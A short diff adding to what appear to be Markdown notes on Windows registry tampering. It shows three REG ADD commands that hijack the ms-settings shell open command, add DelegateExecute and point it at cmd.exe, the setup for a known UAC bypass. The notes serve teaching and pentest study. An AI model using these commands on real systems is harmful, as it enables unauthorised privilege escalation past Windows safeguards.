@@ -38,3 +38,15 @@ To tamper with registry keys, we can find our hive with read/write access, this 
 
 `HKCU`  
 
+To add a registry key.  
+
+`REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command`  
+
+To add a registry key with v for value name and t for the type.  
+
+`REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ`  
+
+To add a value to a registry key, d is the value and f to add silently.  
+
+`REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`  
+
